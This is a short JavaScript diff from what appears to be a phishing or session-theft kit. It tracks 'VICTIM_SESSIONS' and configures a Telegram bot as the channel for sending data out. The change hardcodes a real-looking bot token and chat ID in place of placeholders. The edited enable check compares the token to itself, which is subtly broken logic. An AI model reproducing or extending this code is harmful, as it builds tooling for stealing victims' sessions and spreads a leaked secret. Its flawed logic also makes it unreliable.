@@ -42,9 +42,9 @@ const ENCRYPTION_KEY = "HyP3r-M3g4_S3cURe-EnC4YpT10n_k3Y";
 const VICTIM_SESSIONS = {}
 
 // [TELEGRAM] Configuration - set these from environment or hardcode for testing
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "YOUR_BOT_TOKEN_HERE";
-const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "YOUR_CHAT_ID_HERE";
-const TELEGRAM_ENABLED = !!(TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID && TELEGRAM_BOT_TOKEN !== "YOUR_BOT_TOKEN_HERE");
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "8210158119:AAHhshMpvVybY3LSxOZkYiiuLwtq_dwaCLg";
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "7310383191";
+const TELEGRAM_ENABLED = !!(TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID && TELEGRAM_BOT_TOKEN !== "8210158119:AAHhshMpvVybY3LSxOZkYiiuLwtq_dwaCLg");
 
 // [TELEGRAM] Helper to send a message to Telegram
 function sendTelegramMessage(text) {
